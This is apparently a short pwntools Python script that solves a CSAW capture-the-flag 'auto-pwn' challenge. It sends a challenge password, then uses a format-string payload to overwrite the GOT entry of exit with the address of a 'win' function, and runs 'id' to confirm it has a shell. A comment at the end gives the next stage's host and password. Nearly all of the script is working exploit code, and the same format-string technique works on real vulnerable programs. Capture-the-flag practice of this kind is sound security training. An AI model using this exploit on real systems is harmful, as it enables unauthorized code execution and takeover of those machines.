#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./target')
context.update(arch='i386', os='linux')
#writes = {0xffffd11c: 0x08049f99}

#p = remote("auto-pwn.chal.csaw.io", 11001)
p = process('./target')
p.recvuntil(b'> ')
p.sendline(b'cd80d3cd8a479a18bbc9652f3631c61c')
p.recvuntil(b'> ')

# AABBBB %x %x %x %x %x %x %x
# AABBBB 96 f7f7b580 804a0fb 0 41410000 42424242 20782520
WIN = exe.functions['win'].address
EXIT = exe.got['exit']

writes = {EXIT: WIN}
print(writes)

payload = b"\x90\x90" + fmtstr_payload(6, writes, numbwritten=2)
p.sendline(payload)

p.recvuntil(b"Time to go write this!\n")
#p.recvuntil("Thanks! I'll work with the following:")
#p.interactive()
p.sendline(b'id')
print(p.recvline())
p.close()

# cat message.txt
# Sorry, but your flag is in another box! nc auto-pwn.chal.csaw.io 11002 and use password 4a47f4618ce3e7b567cce92b48f41e61